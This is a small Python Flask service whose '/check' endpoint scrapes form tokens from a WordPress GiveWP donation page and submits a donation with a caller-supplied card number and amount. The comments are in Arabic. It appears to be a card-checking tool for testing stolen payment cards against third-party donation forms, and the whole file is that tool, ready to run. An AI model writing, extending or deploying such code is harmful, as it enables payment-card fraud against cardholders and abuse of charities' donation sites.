from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

@app.route("/check", methods=["GET"])
def check():
    url = request.args.get("url")
    card = request.args.get("card")
    amount = request.args.get("amount")

    if not url or not card or not amount:
        return jsonify({"result": "Error: url, card and amount required"})

    try:
        session = requests.Session()

        # 1️⃣ فتح صفحة التبرع
        page = session.get(url, timeout=10).text

        # 2️⃣ استخراج tokens
        form_id = re.search(r'name="give-form-id" value="(.*?)"', page)
        form_hash = re.search(r'name="give-form-hash" value="(.*?)"', page)

        if not form_id or not form_hash:
            return jsonify({"result": "Error: tokens not found"})

        # 3️⃣ تجهيز بيانات الدفع
        payload = {
            "action": "give_process_donation",
            "give-form-id": form_id.group(1),
            "give-form-hash": form_hash.group(1),
            "give-amount": amount,
            "card": card
        }

        # 4️⃣ إرسال POST request للبوابة
        ajax_url = url.split("/give")[0] + "/wp-admin/admin-ajax.php"
        resp = session.post(ajax_url, data=payload, timeout=10)

        # 5️⃣ ارجع الرد
        return jsonify({"result": resp.text[:500]})

    except Exception as e:
        return jsonify({"result": f"Error: {str(e)}"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
